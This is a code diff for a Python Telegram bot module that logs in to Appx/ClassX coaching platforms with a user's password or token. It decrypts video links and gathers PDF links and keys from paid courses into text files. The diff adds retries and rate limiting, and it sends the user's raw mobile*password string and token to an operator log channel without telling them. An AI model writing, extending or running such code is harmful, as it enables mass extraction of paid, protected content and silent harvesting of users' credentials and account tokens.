@@ -9,18 +9,18 @@ import aiohttp
 import base64
 from Crypto.Cipher import AES
 from Extractor.modules.mix import v2_new
-from Extractor.core.utils import forward_to_log
 from Crypto.Util.Padding import unpad
 from base64 import b64decode
 from bs4 import BeautifulSoup
+from concurrent.futures import ThreadPoolExecutor
 import time 
-from config import PREMIUM_LOGS, join
-from datetime import datetime
-import pytz
+from config import CHANNEL_ID
 
-india_timezone = pytz.timezone('Asia/Kolkata')
-current_time = datetime.now(india_timezone)
-time_new = current_time.strftime("%d-%m-%Y %I:%M %p")
+log_channel = CHANNEL_ID
+log_channel2 = CHANNEL_ID
+
+# Concurrent requests ko control karne ke liye rate limiter
+SEMAPHORE = asyncio.Semaphore(5)
 
 def decrypt(enc):
     try:
@@ -42,25 +42,39 @@ def decode_base64(encoded_str):
     except Exception as e:
         return f"Error decoding string: {e}"
 
-async def fetch(session, url, headers):
+def extract_userid_from_token(token):
+    """JWT Token se real user ID extract karne ke liye helper function"""
     try:
-        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as response:
-            if response.status != 200:
-                return {}
-            content = await response.text()
-            soup = BeautifulSoup(content, 'html.parser')
-            return json.loads(str(soup))
-    except Exception as e:
-        print(f"Fetch error {url}: {str(e)}")
+        payload_str = token.split('.')[1]
+        payload_bytes = base64.b64decode(payload_str + '==')
+        payload = json.loads(payload_bytes)
+        return str(payload.get("id") or payload.get("userid") or payload.get("user_id") or "-2")
+    except Exception:
+        return "-2"
+
+async def fetch(session, url, headers):
+    async with SEMAPHORE:
+        for attempt in range(3):
+            try:
+                async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as response:
+                    if response.status == 429:
+                        await asyncio.sleep(2)
+                        continue
+                    if response.status != 200:
+                        return {}
+                    content = await response.text()
+                    soup = BeautifulSoup(content, 'html.parser')
+                    return json.loads(str(soup))
+            except Exception as e:
+                print(f"Fetch error {url}: {str(e)}")
+                await asyncio.sleep(1)
         return {}
 
 async def handle_course(session, api_base, bi, si, sn, topic, hdr1):
     ti = topic.get("topicid")
     tn = topic.get("topic_name")
     
-    # Live/Normal Classes Endpoint
     url_live = f"{api_base}/get/livecourseclassbycoursesubtopconceptapiv3?courseid={bi}&subjectid={si}&topicid={ti}&conceptid=&start=-1"
-    # Database (DB) Classes Endpoint
     url_db = f"{api_base}/get/dbcourseclassbycoursesubtopconceptapiv3?courseid={bi}&subjectid={si}&topicid={ti}&conceptid=&start=-1"
     
     r3_live, r3_db = await asyncio.gather(
@@ -75,7 +89,7 @@ async def handle_course(session, api_base, bi, si, sn, topic, hdr1):
     if isinstance(r3_db, dict) and r3_db.get("data"):
         video_data.extend(r3_db.get("data", []))
 
-    # Deduplicate videos by ID
+    # Deduplicate video entries by ID
     seen_ids = set()
     unique_videos = []
     for v in video_data:
@@ -85,7 +99,6 @@ async def handle_course(session, api_base, bi, si, sn, topic, hdr1):
             unique_videos.append(v)
 
     unique_videos = sorted(unique_videos, key=lambda x: x.get("id", 0))
-
     tasks = [process_video(session, api_base, bi, si, sn, ti, tn, video, hdr1) for video in unique_videos]
     results = await asyncio.gather(*tasks, return_exceptions=True)
     
@@ -101,10 +114,11 @@ async def process_video(session, api_base, bi, si, sn, ti, tn, video, hdr1):
     
     try:
         r4 = await fetch(session, f"{api_base}/get/fetchVideoDetailsById?course_id={bi}&video_id={vi}&ytflag=0&folder_wise_course=0", hdr1)
-        data = r4.get("data", {})
-        if not data:
+        
+        if not r4 or not r4.get("data"):
             return None
 
+        data = r4.get("data", {})
         vt = data.get("Title", "").strip()
         vl = data.get("download_link", "")
         fl = data.get("video_id", "")
@@ -133,7 +147,7 @@ async def process_video(session, api_base, bi, si, sn, ti, tn, video, hdr1):
                     da = decrypt(a)
                     lines.append(f"{vt}:{da}\n")
         
-        # Handling PDFs & Additional materials
+        # PDFs handling
         p1 = data.get("pdf_link", "")
         pk1 = data.get("pdf_encryption_key", "")
         p2 = data.get("pdf_link2", "")
@@ -150,165 +164,150 @@ async def process_video(session, api_base, bi, si, sn, ti, tn, video, hdr1):
                         
         return lines
     except Exception as e:
-        print(f"Error processing video {vi}: {str(e)}")
+        print(f"Error processing video ID {vi}: {str(e)}")
         return None
 
-@app.on_message(filters.command(["appx", "appx4", "apiv4"]))
+THREADPOOL = ThreadPoolExecutor(max_workers=100)
+
+@app.on_message(filters.command(["appx"]))
 async def appex_v4_txt(app, message):
-    api_prompt = (
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "🌐 <b>ᴇɴᴛᴇʀ ᴀᴘɪ ᴜʀʟ</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "📌 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
-        "<code>tcsexamzoneapi.classx.co.in</code>\n\n"
-        "━━━━━━━━━━━━━━━━━━━━━"
-    )
-    api = await app.ask(message.chat.id, text=api_prompt)
+    api = await app.ask(message.chat.id, text="**SEND APPX API Without https://\n\n✅ Example:\ntcsexamzoneapi.classx.co.in**")
     api_txt = api.text.strip()
-    name = api_txt.split('.')[0].replace("api", "") if api_txt else ""
+    name = api_txt.split('.')[0].replace("api", "") if api_txt else api_txt.split('.')[0]
     if "api" in api_txt:
         await appex_v5_txt(app, message, api_txt, name)
     else:
-        await app.send_message(message.chat.id, "❌ <b>ɪɴᴠᴀʟɪᴅ ᴀᴘɪ ᴜʀʟ</b>")
+        await app.send_message(message.chat.id, "INVALID INPUT IF YOU DONT KNOW API GO TO FIND API OPTION")
 
-async def appex_v5_txt(app, message, api, name, predefined_credentials=None):
+async def appex_v5_txt(app, message, api, name):
     api_base = api.replace("http://", "https://") if api.startswith(("http://", "https://")) else f"https://{api}"
-    app_name = api_base.replace("https://", "").replace("api.classx.co.in","").replace("api.appx.co.in", "").replace("/", "").strip()
+    app_name = api_base.replace("http://", " ").replace("https://", " ").replace("api.classx.co.in"," ").replace("api.akamai.net.in", " ").replace("apinew.teachx.in", " ").replace("api.cloudflare.net.in", " ").replace("api.appx.co.in", " ").replace("/", " ").strip()
     
-    login_prompt = (
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "🎭 <b>PRO_TXT_EXTRATOR_BOT</b> 🎭\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "1️⃣ <code>ID*Password</code>\n"
-        "2️⃣ <b>TOKEN DIRECTLY</b>\n\n"
-        "━━━━━━━━━━━━━━━━━━━━━"
-    )
+    input1 = await app.ask(message.chat.id, f"SEND MOBILE NUMBER AND PASSWORD IN THIS FORMAT\n\n MOBILE*PASSWORD\n\nᴄᴏᴀᴄʜɪɴɢ ɴᴀᴍᴇ:- {app_name}\n\n OR SEND TOKEN")
+    raw_text = input1.text.strip()
     
-    if predefined_credentials:
-        raw_text = predefined_credentials
-    else:
-        input1 = await app.ask(message.chat.id, login_prompt)
-        await forward_to_log(input1, "Appex Extractor")
-        raw_text = input1.text.strip()
-    
+    userid = "-2"
     token = ""
-    userid = "1234"
-
+    
     if '*' in raw_text:
         email, password = raw_text.split("*", 1)
         raw_url = f"{api_base}/post/userLogin"
         headers = {
             "Auth-Key": "appxapi",
             "User-Id": "-2",
+            "Authorization": "",
+            "User_app_category": "",
+            "Language": "en",
             "Content-Type": "application/x-www-form-urlencoded",
+            "Accept-Encoding": "gzip, deflate",
             "User-Agent": "okhttp/4.9.1"
         }
         data = {"email": email, "password": password}
         
         try:
-            res = requests.post(raw_url, data=data, headers=headers, timeout=15).json()
-            if res.get("status") == 200:
-                userid = str(res["data"]["userid"])
-                token = res["data"]["token"]
-            elif res.get("status") == 203:
-                second_url = f"{api_base}/post/userLogin?extra_details=0"
-                s_data = {"phone": email, "email": email, "password": password, "extra_details": "1"}
-                s_res = requests.post(second_url, headers=headers, data=s_data, timeout=15).json()
-                if s_res.get("status") == 200:
-                    userid = str(s_res["data"]["userid"])
-                    token = s_res["data"]["token"]
-                else:
-                    return await message.reply_text("❌ <b>Login Failed: Invalid Credentials</b>")
-            else:
-                return await message.reply_text(f"❌ <b>Login Failed: Status Code {res.get('status')}</b>")
+            response = requests.post(raw_url, data=data, headers=headers, timeout=15).json()
+            status = response.get("status")
+
+            if status == 200:
+                userid = str(response["data"]["userid"])
+                token = response["data"]["token"]
+            elif status == 203:
+                second_api_url = f"{api_base}/post/userLogin?extra_details=0"
+                second_headers = {
+                    "auth-key": "appxapi",
+                    "client-service": "Appx",
+                    "source": "website",
+                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
+                    "accept": "*/*",
+                    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
+                }
+                second_data = {
+                    "source": "website",
+                    "phone": email,
+                    "email": email,
+                    "password": password,
+                    "extra_details": "1"
+                }
+                second_response = requests.post(second_api_url, headers=second_headers, data=second_data, timeout=15).json()
+                if second_response.get("status") == 200:
+                    userid = str(second_response["data"]["userid"])
+                    token = second_response["data"]["token"]
         except Exception as e:
-            return await message.reply_text(f"❌ <b>Login Error:</b> {str(e)}")
+            print(f"Login error: {str(e)}")
+            return await message.reply_text("Please try again later. Maybe Password Wrong.")
     else:
-        # TOKEN HANDLER WITH JWT USER-ID EXTRACTION
+        # Direct Token logic with automatic User-ID extraction
         token = raw_text
-        try:
-            payload_str = token.split('.')[1]
-            payload_bytes = base64.b64decode(payload_str + '==')
-            payload = json.loads(payload_bytes)
-            userid = str(payload.get("id") or payload.get("userid") or payload.get("user_id") or "1234")
-        except Exception:
-            userid = "1234"
+        userid = extract_userid_from_token(token)
 
     if not token:
-        return await message.reply_text("❌ <b>Invalid Token or Password Provided!</b>")
+        return await message.reply_text("Invalid Token or Credentials provided.")
 
     hdr1 = {
         "Client-Service": "Appx",
         "source": "website",
         "Auth-Key": "appxapi",
         "Authorization": token,
-        "User-ID": userid
+        "User-ID": userid,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
     }  
-        
+
     scraper = cloudscraper.create_scraper() 
+    mc1 = {}
     try:
         res = scraper.get(f"{api_base}/get/mycoursev2?userid={userid}", headers=hdr1, timeout=15)
-        if res.status_code != 200:
-            return await message.reply_text(f"❌ <b>Error {res.status_code}:</b> Invalid Token or Server Down.")
         mc1 = res.json()
-    except json.JSONDecodeError:
-        return await message.reply_text("❌ <b>JSON Error:</b> Non-JSON response received from server.")
+    except json.JSONDecodeError as e:
+        print(f"JSON decode error: {str(e)}")
+        return await message.reply_text("Error decoding response from server. Check API or Token.")
     except Exception as e:
-        return await message.reply_text(f"❌ <b>Extraction Error:</b> {str(e)}")
-
-    batch_list = "📚 <b>ᴀᴠᴀɪʟᴀʙʟᴇ ʙᴀᴛᴄʜᴇs</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
+        print(f"An error occurred: {str(e)}")
+        return await message.reply_text("An error occurred while fetching your courses. Please try again later.")
+    
+    FFF = "𝗕𝗔𝗧𝗖𝗛 𝗜𝗗 ➤ 𝗕𝗔𝗧𝗖𝗛 𝗡𝗔𝗠𝗘\n\n"
     valid_ids = []
 
     if "data" in mc1 and mc1["data"]:
         for ct in mc1["data"]:
             ci = str(ct.get("id"))
             cn = ct.get("course_name")
-            price = ct.get("price", "N/A")
-            batch_list += f"┣━➤ <code>{ci}</code>\n┃   <b>{cn}</b>\n┃   💰 ₹{price}\n┃\n"
+            FFF += f"**`{ci}`   -   `{cn}`**\n\n"
             valid_ids.append(ci)
     else:
-        return await message.reply_text("❌ <b>ɴᴏ ʙᴀᴛᴄʜᴇs ғᴏᴜɴᴅ!</b>")
+        return await message.reply_text("NO BATCH PURCHASED OR INVALID TOKEN")
 
-    success_msg = (
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        f"✨ <b>{app_name}</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🎯 <b>sᴛᴀᴛᴜs:</b> ʟᴏɢɪɴ sᴜᴄᴄᴇssғᴜʟ ✅\n\n"
-        f"📡 <b>ᴀᴘɪ:</b> <code>{api_base}</code>\n"
-        f"🔰 <b>Tᴏᴋᴇɴ:</b> <pre>{token}</pre>\n\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        f"{batch_list}"
-    )
-
-    if len(batch_list) <= 4096:
-        await app.send_message(PREMIUM_LOGS, success_msg)
-        editable1 = await message.reply_text(success_msg)
+    dl = f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for {app_name} \n {api_base}\n\n `{raw_text}` \n\n`{token}`\n\n{FFF}"
+    if len(FFF) <= 4096:
+        await app.send_message(log_channel, dl)
+        await app.send_message(log_channel2, f"`{token}`")
+        editable1 = await message.reply_text(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅\n\n`{token}`\n\n{FFF}")      
     else:
-        file_path = f"{app_name}_batches.txt"
+        plain_FFF = FFF.replace("**", "").replace("`", "")
+        file_path = f"{app_name}.txt"
         with open(file_path, "w", encoding="utf-8") as file:
-            file.write(f"{success_msg}\n\nToken: {token}")
+            file.write(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for {app_name}\n\nToken: {token}\n\n{plain_FFF}")
 
-        await app.send_document(message.chat.id, document=file_path, caption="📚 Batch list exported to file")
-        await app.send_document(PREMIUM_LOGS, document=file_path)
+        await app.send_document(
+            message.chat.id,
+            document=file_path,
+            caption="Too many batches, so select batch IDs from the text file."
+        )
+        await app.send_document(log_channel, document=file_path, caption="Too many batches.")
         editable1 = None
 
-    batch_prompt = (
-        "━━━━━━━━━━━━━━━━━━━━━\n"
-        "📥 <b>ᴅᴏᴡɴʟᴏᴀᴅ ʙᴀᴛᴄʜᴇs</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "📋 <b>ᴄᴏᴘʏ ᴀʟʟ ʙᴀᴛᴄʜᴇs:</b>\n"
-        f"<code>{('&').join(valid_ids)}</code>\n\n"
-        "━━━━━━━━━━━━━━━━━━━━━"
-    )
-    
-    input2 = await app.ask(message.chat.id, batch_prompt)
-    if not input2 or not input2.text:
-        return await message.reply_text("**Invalid input.**")
+    input2 = await app.ask(message.chat.id, "**Send multiple Course IDs separated by '&' to Download or copy below text to download all batches**\n\n`" + "&".join(valid_ids) + "`")
 
-    batch_ids = [b.strip() for b in input2.text.strip().split("&") if b.strip() in valid_ids]
+    batch_ids = [batch.strip() for batch in input2.text.strip().split("&") if batch.strip() in valid_ids]
 
     if not batch_ids:
-        return await message.reply_text("**Invalid batch ID(s).**")
+        await message.reply_text("**Invalid Course ID(s). Please send valid Course IDs from the list.**")
+        try:
+            await input2.delete(True)
+            if editable1:
+                await editable1.delete(True)
+        except Exception:
+            pass
+        return
 
     m1 = await message.reply_text("Processing your requested batches...")
 
@@ -316,94 +315,82 @@ async def appex_v5_txt(app, message, api, name, predefined_credentials=None):
         m2 = await message.reply_text(f"Extracting batch `{raw_text2}`...")
         start_time = time.time()
         
-        course_info = next((ct for ct in mc1["data"] if str(ct.get("id")) == raw_text2), {})
+        course_info = next((ct for ct in mc1.get("data", []) if str(ct.get("id")) == raw_text2), {})
         course_name = course_info.get("course_name", "Course")
-        thumbnail = course_info.get("course_thumbnail", "")
-        start_date = course_info.get("start_date", "N/A")
-        end_date = course_info.get("end_date", "N/A")
-        price = course_info.get("price", "N/A")
-        
+        start = course_info.get("start_date", "N/A")
+        end = course_info.get("end_date", "N/A")
+        pricing = course_info.get("price", "N/A")
+        cp = course_info.get("course_thumbnail", "")
+
         try:
-            r = scraper.get(f"{api_base}/get/course_by_id?id={raw_text2}", headers=hdr1, timeout=15)
-            try:
-                r_json = r.json()
-            except Exception:
-                sanitized_course_name = course_name.replace(':', '_').replace('/', '_')
-                await v2_new(app, message, token, userid, hdr1, app_name, raw_text2, api_base, sanitized_course_name, start_time, start_date, end_date, price, input2, m1, m2)
-                continue
-
-            if not r_json.get("data"):
-                sanitized_course_name = course_name.replace(':', '_').replace('/', '_')
-                await v2_new(app, message, token, userid, hdr1, app_name, raw_text2, api_base, sanitized_course_name, start_time, start_date, end_date, price, input2, m1, m2)
-                continue
-
-            for i in r_json.get("data", []):
-                txtn = i.get("course_name", "Batch")
-                filename1 = f"{raw_text2}_{txtn.replace(':', '_').replace('/', '_')}.txt".replace(" ", "_")
-
-                async with aiohttp.ClientSession() as session:
-                    with open(filename1, 'w', encoding='utf-8') as f:
-                        try:
-                            r1 = await fetch(session, f"{api_base}/get/allsubjectfrmlivecourseclass?courseid={raw_text2}&start=-1", hdr1)
-                
-                            for subject in r1.get("data", []):
-                                si = subject.get("subjectid")
-                                sn = subject.get("subject_name")
-
-                                r2 = await fetch(session, f"{api_base}/get/alltopicfrmlivecourseclass?courseid={raw_text2}&subjectid={si}&start=-1", hdr1)
-                                topics = sorted(r2.get("data", []), key=lambda x: x.get("topicid", 0))
-
-                                tasks = [handle_course(session, api_base, raw_text2, si, sn, t, hdr1) for t in topics]
-                                all_data = await asyncio.gather(*tasks, return_exceptions=True)
-                    
-                                for data in all_data:
-                                    if isinstance(data, list) and data:
-                                        f.writelines(data)
-            
-                        except Exception as e:
-                            print(f"Error processing batch {raw_text2}: {str(e)}")
-                            sanitized_course_name = course_name.replace(':', '_').replace('/', '_')
-                            await v2_new(app, message, token, userid, hdr1, app_name, raw_text2, api_base, sanitized_course_name, start_time, start_date, end_date, price, input2, m1, m2)
-                            continue
-                        
-                    elapsed_time = time.time() - start_time
-                    caption = (
-                        "࿇ ══━━ 🏦 ━━══ ࿇\n\n"
-                        f"🌀 **Aᴘᴘ Nᴀᴍᴇ** : {app_name}\n"
-                        f"============================\n\n"
-                        f"🎯 **Bᴀᴛᴄʜ Nᴀᴍᴇ** : `{raw_text2}_{txtn}`\n"
-                        f"🌟 **Cᴏᴜʀsᴇ Tʜᴜᴍʙɴᴀɪʟ** : <a href='{thumbnail}'>Thumbnail</a>\n\n"
-                        f"📅 **Sᴛᴀʀᴛ Dᴀᴛᴇ** : {start_date}\n"
-                        f"📅 **Eɴᴅ Dᴀᴛᴇ** : {end_date}\n"
-                        f"💰 **Pʀɪᴄᴇ** : ₹{price}\n\n"
-                        f"🌐 **Jᴏɪɴ Us** : {join}\n"
-                        f"⏱ **Tɪᴍᴇ Tᴀᴋᴇɴ** : {elapsed_time:.1f}s\n"
-                        f"📅 **Dᴀᴛᴇ** : {time_new}\n"
-                        "━━━━━━━━━━━━━━━━━━━━━\n"
-                        "🔰 ᴍᴀɪɴᴛᴀɪɴᴇᴅ ʙʏ @PRO_TXT_EXTRATOR_BOT"
-                    )
-                
-                    try:
-                        await app.send_document(message.chat.id, filename1, caption=caption)
-                        await app.send_document(PREMIUM_LOGS, filename1, caption=caption)
-                    except Exception as e:
-                        print(f"Document send error: {str(e)}")
-                    finally:
-                        if os.path.exists(filename1):
-                            os.remove(filename1)
-                            
+            r = scraper.get(f"{api_base}/get/course_by_id?id={raw_text2}", headers=hdr1, timeout=15).json()
         except Exception as e:
-            print(f"Batch processing error {raw_text2}: {str(e)}")
+            print(f"Error fetching course details: {str(e)}")
             sanitized_course_name = course_name.replace(':', '_').replace('/', '_')
-            await v2_new(app, message, token, userid, hdr1, app_name, raw_text2, api_base, sanitized_course_name, start_time, start_date, end_date, price, input2, m1, m2)
-        finally:
-            try:
-                await m2.delete()
-            except Exception:
-                pass
+            await v2_new(app, message, token, userid, hdr1, app_name, raw_text2, api_base, sanitized_course_name, start_time, start, end, pricing, input2, m1, m2)
+            continue
+
+        if not r.get("data"):
+            sanitized_course_name = course_name.replace(':', '_').replace('/', '_')
+            await v2_new(app, message, token, userid, hdr1, app_name, raw_text2, api_base, sanitized_course_name, start_time, start, end, pricing, input2, m1, m2)
+            continue
+
+        for i in r.get("data", []):
+            txtn = i.get("course_name", "Batch")
+            filename1 = f"{raw_text2}_{txtn.replace(':', '_').replace('/', '_')}.txt".replace(" ", "_")
+
+            async with aiohttp.ClientSession() as session:
+                with open(filename1, 'w', encoding='utf-8') as f:
+                    try:
+                        r1 = await fetch(session, f"{api_base}/get/allsubjectfrmlivecourseclass?courseid={raw_text2}&start=-1", hdr1)
+            
+                        for subject in r1.get("data", []):
+                            si = subject.get("subjectid")
+                            sn = subject.get("subject_name")
+
+                            r2 = await fetch(session, f"{api_base}/get/alltopicfrmlivecourseclass?courseid={raw_text2}&subjectid={si}&start=-1", hdr1)
+                            topics = sorted(r2.get("data", []), key=lambda x: x.get("topicid", 0))
+
+                            tasks = [handle_course(session, api_base, raw_text2, si, sn, t, hdr1) for t in topics]
+                            all_data = await asyncio.gather(*tasks, return_exceptions=True)
+                
+                            for data in all_data:
+                                if isinstance(data, list) and data:
+                                    f.writelines(data)
+        
+                    except Exception as e:
+                        print(f"An error occurred while processing the course: {str(e)}")
+                        sanitized_course_name = course_name.replace(':', '_').replace('/', '_')
+                        await v2_new(app, message, token, userid, hdr1, app_name, raw_text2, api_base, sanitized_course_name, start_time, start, end, pricing, input2, m1, m2)
+                        continue
+                    
+                end_time = time.time()
+                elapsed_time = end_time - start_time
+            
+                c_text = (
+                    f"**APP NAME: <b>{app_name}</b>**\n"
+                    f"**BatchName:** {raw_text2}_{txtn}\n"
+                    f"**Validity Start:** {start}\n"
+                    f"**Validity Ends:** {end}\n"
+                    f"Elapsed time: {elapsed_time:.1f} seconds\n"
+                    f"**Batch Price:** {pricing}\n"
+                    f"**course_thumbnail:** <a href='{cp}'>Thumbnail</a>"
+                )
+            
+                try:
+                    await app.send_document(message.chat.id, filename1, caption=c_text)
+                    await app.send_document(log_channel, filename1, caption=c_text)
+                except Exception as e:
+                    print(f"An error occurred while sending the document: {str(e)}")
+                    sanitized_course_name = course_name.replace(':', '_').replace('/', '_')
+                    await v2_new(app, message, token, userid, hdr1, app_name, raw_text2, api_base, sanitized_course_name, start_time, start, end, pricing, input2, m1, m2)
+                finally:
+                    if os.path.exists(filename1):
+                        os.remove(filename1)
 
     try:
-        await input2.delete()
-        await m1.delete()
+        await input2.delete(True)
+        await m1.delete(True)
+        await m2.delete(True)
     except Exception:
         pass
